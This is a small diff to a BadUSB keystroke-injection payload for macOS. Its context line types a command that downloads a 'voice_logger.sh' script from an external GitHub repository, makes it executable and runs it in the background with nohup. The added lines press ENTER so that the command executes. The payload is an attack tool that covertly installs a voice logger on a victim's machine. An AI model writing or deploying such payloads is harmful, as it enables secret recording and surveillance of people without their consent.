@@ -32,4 +32,6 @@ ENTER
 DELAY 500
 STRING nohup curl -O 'https://raw.githubusercontent.com/YonKu0/BadUSB/main/Recon/MacOS/Voice%20Logger/voice_logger.sh' && chmod +x voice_logger.sh && ./voice_logger.sh &
 DELAY 1000
+ENTER
+DELAY 500
 GUI w
